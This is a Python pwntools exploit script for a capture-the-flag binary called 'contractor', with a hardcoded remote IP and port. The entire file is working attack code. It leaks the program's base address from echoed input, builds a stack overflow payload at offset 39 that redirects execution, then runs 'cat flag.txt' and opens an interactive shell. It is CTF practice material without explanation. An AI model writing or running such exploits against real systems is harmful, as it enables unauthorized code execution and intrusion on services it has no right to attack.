#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './contractor'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.48.147', 46320

io, pid = None, None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    b *main+1666
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./contractor"]).recvall().strip().decode()
        # attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='contractor')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    io.sendlineafter("> ", p64(0xdeadbeef))
    io.sendlineafter("> ", p64(0xcafebabe))
    io.sendlineafter("> ", str(-1).encode())
    io.sendlineafter("> ", b"A"*0x10)
    io.recvuntil("[Specialty]: AAAAAAAAAAAAAAAA")
    elf.address = u64(io.recvline().strip().ljust(8, b"\x00")) - elf.sym["__libc_csu_init"]
    log.info(f"ELF base: %#x", elf.address)
    io.sendlineafter("> ", str(4).encode())
    offset = 39
    payload = flat({offset: [elf.sym["main"]+1666, elf.sym["contract"]]})
    io.sendlineafter(": ", payload)
    io.recvline()
    io.recvline()
    io.recvline()
    io.sendline("cat flag.txt")
    io.interactive()

if __name__ == '__main__':
    exploit()
